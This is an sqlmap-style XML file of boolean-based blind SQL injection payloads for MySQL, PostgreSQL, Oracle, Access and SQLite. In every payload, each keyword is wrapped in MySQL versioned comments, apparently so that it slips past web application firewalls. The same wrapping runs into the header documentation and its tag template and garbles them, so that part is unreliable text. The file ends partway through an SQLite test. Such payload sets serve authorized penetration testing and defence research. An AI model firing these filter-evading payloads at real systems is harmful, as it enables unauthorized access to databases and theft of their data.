<?xml version="1.0" encoding="UTF-8"?>

<!--
Tag: <test>
    SQL injection test definition.

    Sub-tag: <title>
        Title of the test.

    Sub-tag: <stype>
        SQL injection family type.

        Valid values:
            1: Boolean-based blind SQL injection
            2: Error-based queries SQL injection
            3: Inline queries SQL injection
            4: Stacked queries SQL injection
            5: Time-based blind SQL injection
            6: UNION query SQL injection

    Sub-tag: <level>
        From which level check for this test.

        Valid values:
            1: Always (<100 requests)
            2: Try a bit harder (100-200 requests)
            3: Good number of requests (200-500 requests)
            4: Extensive test (500-1000 requests)
            5: You have plenty of time (>1000 requests)

    Sub-tag: <risk>
        Likelihood of a payload to damage the data integrity.

        Valid values:
            1: Low risk
            2: Medium risk
            3: High risk

    Sub-tag: <clause>
        In which clause the payload can work.

        NOTE: for instance, there are some payload that do not have to be
        tested as soon as it has been identified whether or not the
        injection is within a WHERE clause condition.

        Valid values:
            0: Always
            1: WHERE / HAVING
            2: GROUP BY
            3: ORDER BY
            4: LIMIT
            5: OFFSET
            6: TOP
            7: Table name
            8: Column name
            9: Pre-WHERE (non-query)

        A comma separated list of these values is also possible.

    Sub-tag: <where>
        Where to add our '<prefix> <payload></*!50000comment/**_**/*/> </*!50000suffix/**_**/*/>' /*!50000string/**_**/*/.

        /*!50000Valid/**_**/*/ /*!50000values/**_**/*/:
            /*!500001/**_**/*/: /*!50000Append/**_**/*/ /*!50000the/**_**/*/ /*!50000string/**_**/*/ /*!50000to/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/
            /*!500002/**_**/*/: /*!50000Replace/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/ /*!50000with/**_**/*/ /*!50000a/**_**/*/ /*!50000negative/**_**/*/ /*!50000random/**_**/*/
               /*!50000integer/**_**/*/ /*!50000value/**_**/*/ /*!50000and/**_**/*/ /*!50000append/**_**/*/ /*!50000our/**_**/*/ /*!50000string/**_**/*/
            /*!500003/**_**/*/: /*!50000Replace/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/ /*!50000with/**_**/*/ /*!50000our/**_**/*/ /*!50000string/**_**/*/

    /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000vector/**_**/*/>
        /*!50000The/**_**/*/ /*!50000payload/**_**/*/ /*!50000that/**_**/*/ /*!50000will/**_**/*/ /*!50000be/**_**/*/ /*!50000used/**_**/*/ /*!50000to/**_**/*/ /*!50000exploit/**_**/*/ /*!50000the/**_**/*/ /*!50000injection/**_**/*/ /*!50000point/**_**/*/.

    /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000request/**_**/*/>
        /*!50000What/**_**/*/ /*!50000to/**_**/*/ /*!50000inject/**_**/*/ /*!50000for/**_**/*/ /*!50000this/**_**/*/ /*!50000test/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000payload/**_**/*/>
            /*!50000The/**_**/*/ /*!50000payload/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000comment/**_**/*/>
            /*!50000Comment/**_**/*/ /*!50000to/**_**/*/ /*!50000append/**_**/*/ /*!50000to/**_**/*/ /*!50000the/**_**/*/ /*!50000payload/**_**/*/, /*!50000before/**_**/*/ /*!50000the/**_**/*/ /*!50000suffix/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000char/**_**/*/>
            /*!50000Character/**_**/*/ /*!50000to/**_**/*/ /*!50000use/**_**/*/ /*!50000to/**_**/*/ /*!50000bruteforce/**_**/*/ /*!50000number/**_**/*/ /*!50000of/**_**/*/ /*!50000columns/**_**/*/ /*!50000in/**_**/*/ /*!50000UNION/**_**/*/
            /*!50000query/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/ /*!50000tests/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000columns/**_**/*/>
            /*!50000Range/**_**/*/ /*!50000of/**_**/*/ /*!50000columns/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000in/**_**/*/ /*!50000UNION/**_**/*/ /*!50000query/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/
            /*!50000tests/**_**/*/.

    /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000response/**_**/*/>
        /*!50000How/**_**/*/ /*!50000to/**_**/*/ /*!50000identify/**_**/*/ /*!50000if/**_**/*/ /*!50000the/**_**/*/ /*!50000injected/**_**/*/ /*!50000payload/**_**/*/ /*!50000succeeded/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000comparison/**_**/*/>
            /*!50000Perform/**_**/*/ /*!50000a/**_**/*/ /*!50000request/**_**/*/ /*!50000with/**_**/*/ /*!50000this/**_**/*/ /*!50000string/**_**/*/ /*!50000as/**_**/*/ /*!50000the/**_**/*/ /*!50000payload/**_**/*/ /*!50000and/**_**/*/ /*!50000compare/**_**/*/
            /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000with/**_**/*/ /*!50000the/**_**/*/ </*!50000payload/**_**/*/> /*!50000response/**_**/*/. /*!50000Apply/**_**/*/ /*!50000the/**_**/*/ /*!50000comparison/**_**/*/
            /*!50000algorithm/**_**/*/.

            /*!50000NOTE/**_**/*/: /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000boolean/**_**/*/-/*!50000based/**_**/*/ /*!50000blind/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injections/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000grep/**_**/*/>
            /*!50000Regular/**_**/*/ /*!50000expression/**_**/*/ /*!50000to/**_**/*/ /*!50000grep/**_**/*/ /*!50000for/**_**/*/ /*!50000in/**_**/*/ /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000body/**_**/*/.

            /*!50000NOTE/**_**/*/: /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000error/**_**/*/-/*!50000based/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000time/**_**/*/>
            /*!50000Time/**_**/*/ /*!50000in/**_**/*/ /*!50000seconds/**_**/*/ /*!50000to/**_**/*/ /*!50000wait/**_**/*/ /*!50000before/**_**/*/ /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000is/**_**/*/ /*!50000returned/**_**/*/.

            /*!50000NOTE/**_**/*/: /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000time/**_**/*/-/*!50000based/**_**/*/ /*!50000blind/**_**/*/ /*!50000and/**_**/*/ /*!50000stacked/**_**/*/ /*!50000queries/**_**/*/
            /*!50000SQL/**_**/*/ /*!50000injections/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000union/**_**/*/>
            /*!50000Calls/**_**/*/ /*!50000unionTest/**_**/*/() /*!50000function/**_**/*/.

            /*!50000NOTE/**_**/*/: /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000UNION/**_**/*/ /*!50000query/**_**/*/ (/*!50000inband/**_**/*/) /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/.

    /*!50000Sub/**_**/*/-/*!50000tag/**_**/*/: </*!50000details/**_**/*/>
        /*!50000Which/**_**/*/ /*!50000details/**_**/*/ /*!50000can/**_**/*/ /*!50000be/**_**/*/ /*!50000infered/**_**/*/ /*!50000if/**_**/*/ /*!50000the/**_**/*/ /*!50000payload/**_**/*/ /*!50000succeed/**_**/*/.

        /*!50000Sub/**_**/*/-/*!50000tags/**_**/*/: </*!50000dbms/**_**/*/>
            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ (/*!50000e/**_**/*/./*!50000g/**_**/*/. /*!50000MySQL/**_**/*/).

        /*!50000Sub/**_**/*/-/*!50000tags/**_**/*/: </*!50000dbms_version/**_**/*/>
            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ /*!50000version/**_**/*/ (/*!50000e/**_**/*/./*!50000g/**_**/*/. /*!500005/**_**/*/./*!500000/**_**/*/./*!5000051/**_**/*/).

        /*!50000Sub/**_**/*/-/*!50000tags/**_**/*/: </*!50000os/**_**/*/>
            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ /*!50000underlying/**_**/*/ /*!50000operating/**_**/*/
            /*!50000system/**_**/*/.

    </*!50000test/**_**/*/>
        </*!50000title/**_**/*/><//*!50000title/**_**/*/>
        </*!50000stype/**_**/*/><//*!50000stype/**_**/*/>
        </*!50000level/**_**/*/><//*!50000level/**_**/*/>
        </*!50000risk/**_**/*/><//*!50000risk/**_**/*/>
        </*!50000clause/**_**/*/><//*!50000clause/**_**/*/>
        </*!50000where/**_**/*/><//*!50000where/**_**/*/>
        </*!50000vector/**_**/*/><//*!50000vector/**_**/*/>
        </*!50000request/**_**/*/>
            </*!50000payload/**_**/*/></payload>
            <comment></comment>
            <char></char>
            <columns></columns>
        </request>
        <response>
            <comparison></comparison>
            <grep></grep>
            <time></time>
            <union></union>
        </response>
        <details>
            <dbms></dbms>
            <dbms_version></dbms_version>
            <os></os>
        </details>
    </test>
-->

<root>
    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>2</where>
        <vector>OR [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>1</where>
        <vector>OR NOT [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000[RANDNUM]/**_**/*/=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
            <comment>[GENERIC_SQL_COMMENT]</comment>
        </request>
        <response>
            <comparison>AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>2</where>
        <vector>OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000[RANDNUM]/**_**/*/=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
            <comment>[GENERIC_SQL_COMMENT]</comment>
        </request>
        <response>
            <comparison>OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>[GENERIC_SQL_COMMENT]</comment>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>[GENERIC_SQL_COMMENT]</comment>
        </request>
        <response>
            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>OR NOT [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>[GENERIC_SQL_COMMENT]</comment>
        </request>
        <response>
            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>OR NOT [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>AND [INFERENCE]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>%16</comment>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR [INFERENCE]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
            <comment>%16</comment>
        </request>
        <response>
            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>1</where>
        <vector>RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</vector>
        <request>
            <payload>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>AND MAKE_SET([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000MAKE_SET/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1,2,3</clause>
        <where>2</where>
        <vector>OR MAKE_SET([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000MAKE_SET/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>AND ELT([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000ELT/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>3</risk>
        <clause>1,2,3</clause>
        <where>2</where>
        <vector>OR ELT([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000ELT/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 0x3A END)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>3</risk>
        <clause>1,2,3,8</clause>
        <where>2</where>
        <vector>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 0x3A END)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8</clause>
        <where>1</where>
        <vector>AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,/*!50000[RANDNUM]/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,/*!50000[RANDNUM]/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
